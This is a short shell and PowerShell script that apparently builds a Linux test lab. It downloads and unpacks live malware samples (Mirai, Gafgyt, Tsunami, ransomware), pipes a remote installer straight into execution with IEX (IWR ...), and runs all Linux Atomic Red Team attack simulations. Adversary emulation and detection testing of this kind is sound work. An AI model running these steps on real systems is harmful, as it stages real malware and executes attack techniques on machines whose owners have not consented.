echo "### Download Malware Files ###"
wget https://raw.githubusercontent.com/s1NsEaH/malware_SAmple/main/8db3c562d0011c2d9e12b7141d2c35ac1702c6ff538ca220eb10a4709f4c12ee.mirai.linux
wget https://raw.githubusercontent.com/s1NsEaH/malware_SAmple/main/c16fc61415f537f42b9d813cd9538898f53865e1f5b46f25db2ab26bad2dffd2.ransome.linux
wget https://raw.githubusercontent.com/s1NsEaH/malware_SAmple/main/7b1d9594559a78fbe9c9d399be3f38e92dd4b5e2cc13a88c4d70a31f708a2dcc.ddos.Gafgyt.linux
wget https://raw.githubusercontent.com/s1NsEaH/malware_SAmple/main/6c6888a75d6a62dc7414dd22d0b6a70456a108a14889b8406f7aeb8b61b34633.backdoor.Tsunami.linux
wget https://raw.githubusercontent.com/s1NsEaH/malware_SAmple/main/06abc46d5dbd012b170c97d142c6b679183159197e9d3f6a76ba5e5abf999725.ransome.linux
apt-get install -y p7zip-full

echo "### Convert and unzip ###"
for file in *.linux
do
  hash="${file%.linux}"
  xxd -r -p $file > $hash.bin
done

# Extract the contents of the binary files
for file in *.bin
do
  7z x $file -pinfected
done

echo "### Install Powershell on Ubuntu ###"
sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-common
wget -q "https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb"
sudo dpkg -i packages-microsoft-prod.deb
rm packages-microsoft-prod.deb
sudo apt-get update
sudo apt-get install -y powershell
# Start PowerShell
pwsh

IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics
Import-Module "./AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1" -Force

$techniques = gci ./AtomicRedTeam/atomics/* -Recurse -Include T*.yaml | Get-AtomicTechnique

foreach ($technique in $techniques) {
    foreach ($atomic in $technique.atomic_tests) {
        if ($atomic.supported_platforms.contains("linux") -and ($atomic.executor -ne "manual")) {
            # Get Prereqs for test
            Invoke-AtomicTest $technique.attack_technique -TestGuids $atomic.auto_generated_guid -GetPrereqs
            # Invoke
            Invoke-AtomicTest $technique.attack_technique -TestGuids $atomic.auto_generated_guid
            # Sleep then cleanup
            Start-Sleep 3
            Invoke-AtomicTest  $technique.attack_technique -TestGuids $atomic.auto_generated_guid -Cleanup
        }
    }
}
